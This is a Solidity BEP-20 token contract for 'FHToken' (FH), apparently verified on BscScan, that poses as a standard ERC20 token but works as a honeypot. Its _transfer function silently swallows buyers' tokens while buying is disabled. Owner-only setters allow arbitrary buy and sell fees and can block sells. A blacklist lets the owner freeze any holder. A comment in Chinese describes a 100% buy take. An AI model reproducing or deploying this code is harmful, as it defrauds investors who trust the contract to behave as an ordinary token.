/**
 *Submitted for verification at BscScan.com on 2022-07-11
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b);
        // There is no case in which this doesn't hold
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

interface IPancakeFactory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IPancakeRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function getAmountsIn(uint256 amountOut, address[] memory path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IPancakePair {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function sync() external;

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract BlackList is Ownable {
    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////
    function getBlackListStatus(address _maker) external view returns (bool) {
        return isBlackListed[_maker];
    }

    mapping(address => bool) public isBlackListed;

    function addBlackList(address _evilUser) public onlyOwner {
        isBlackListed[_evilUser] = true;
        emit AddedBlackList(_evilUser);
    }

    function removeBlackList(address _clearedUser) public onlyOwner {
        isBlackListed[_clearedUser] = false;
        emit RemovedBlackList(_clearedUser);
    }

    // function destroyBlackFunds (address _blackListedUser) public onlyOwner {
    //     require(isBlackListed[_blackListedUser]);
    //     uint dirtyFunds = balanceOf(_blackListedUser);
    //     balances[_blackListedUser] = 0;
    //     _totalSupply.sub(dirtyFunds);
    //     emit DestroyedBlackFunds(_blackListedUser, dirtyFunds);
    // }

    // event DestroyedBlackFunds(address _blackListedUser, uint _balance);

    event AddedBlackList(address _user);

    event RemovedBlackList(address _user);
}

// 买100%, 卖3%, 6666个, 可取消100%

contract FH is Context, IERC20, IERC20Metadata, Ownable, BlackList {
    using SafeMath for uint256;

    string private _name;
    string private _symbol;
    uint256 private _totalSupply;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public immutable deadAddress =
        0x000000000000000000000000000000000000dEaD;
    address public _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IERC20 public usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);

    mapping(address => bool) public isExcludedFromFee;

    address public _pair;

    uint256 public finalSupply = 6666 * 10**17;

    bool private BuyEnabled = false;
    uint256 private BuyFee = 3;
    uint256 private SellFee = 3;

    constructor() {
        _name = "FHToken";
        _symbol = "FH";
        _mint(owner(), 6666 * 10**18);
        IPancakeRouter router = IPancakeRouter(_router);
        _pair = IPancakeFactory(router.factory()).createPair(
            address(this),
            address(usdt)
        );
        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[_router] = true;
        isExcludedFromFee[address(this)] = true;
    }

    receive() external payable {}

    fallback() external payable {}

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function setBuyEnabled(bool _enabled) public onlyOwner {
        BuyEnabled = _enabled;
    }

    function setBuyFee(uint256 _BuyFee) public onlyOwner {
        BuyFee = _BuyFee;
    }

    function setSellFee(uint256 _SellFee) public onlyOwner {
        SellFee = _SellFee;
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        require(!isBlackListed[msg.sender], "You are blacklisted");
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        require(!isBlackListed[sender], "You are blacklisted");
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

    function _mint(address account, uint256 amount) internal virtual {
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(uint256 amount) internal virtual returns (uint256) {
        if (_totalSupply < finalSupply) {
            return amount;
        }
        if (_totalSupply.sub(amount) <= finalSupply) {
            uint256 burnAmount = _totalSupply.sub(finalSupply);
            _totalSupply = _totalSupply.sub(burnAmount);
            _balances[deadAddress] = _balances[deadAddress].add(burnAmount);
            emit Transfer(address(0), deadAddress, burnAmount);
            return amount.sub(burnAmount);
        } else {
            _totalSupply = _totalSupply.sub(amount);
            _balances[deadAddress] = _balances[deadAddress].add(amount);
            emit Transfer(address(0), deadAddress, amount);
            return 0;
        }
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        if (recipient == _pair && balanceOf(_pair) < 1) {
            require(
                isExcludedFromFee[sender] || isExcludedFromFee[recipient],
                "Only the _whitelist can first addLiquidity"
            );
        }
        if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
            _basicTransfer(sender, recipient, amount);
        } else {
            if (sender == _pair) {
                if (!BuyEnabled) {
                    uint256 senderBalance = _balances[sender];
                    require(
                        senderBalance >= amount,
                        "ERC20: transfer amount exceeds balance 1"
                    );
                    unchecked {
                        _balances[sender] = senderBalance.sub(amount);
                    }
                    emit Transfer(sender, recipient, 0);
                    return;
                } else {
                    uint256 senderBalance = _balances[sender];
                    require(
                        senderBalance >= amount,
                        "ERC20: transfer amount exceeds balance 2"
                    );
                    unchecked {
                        _balances[sender] = senderBalance.sub(amount);
                    }
                    uint256 share = amount.div(100);
                    uint256 Fee = _transactionFee(BuyFee, share);
                    _balances[recipient] = _balances[recipient].add(
                        amount.sub(BuyFee.mul(share)).add(Fee)
                    );
                    emit Transfer(sender, recipient, amount.sub(BuyFee.mul(share)).add(Fee));
                }
            } else if (recipient == _pair) {
                uint256 senderBalance = _balances[sender];
                require(
                    senderBalance >= amount,
                    "ERC20: transfer amount exceeds balance 3"
                );
                unchecked {
                    _balances[sender] = senderBalance.sub(amount);
                }
                uint256 share = amount.div(100);
                uint256 Fee = _transactionFee(SellFee, share);
                _balances[recipient] = _balances[recipient].add(
                    amount.sub(SellFee.mul(share)).add(Fee)
                );
                emit Transfer(sender, recipient, amount.sub(SellFee.mul(share)).add(Fee));
            } else {
                _basicTransfer(sender, recipient, amount);
            }
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setIsExcludedFromFee(address account, bool newValue)
        public
        onlyOwner
    {
        isExcludedFromFee[account] = newValue;
    }

    function setPair(address pair) public onlyOwner {
        _pair = pair;
    }

    function _transactionFee(uint256 FeeRate, uint256 share)
        internal
        returns (uint256)
    {
        uint256 total = share.mul(FeeRate);
        return _burn(total);
    }
}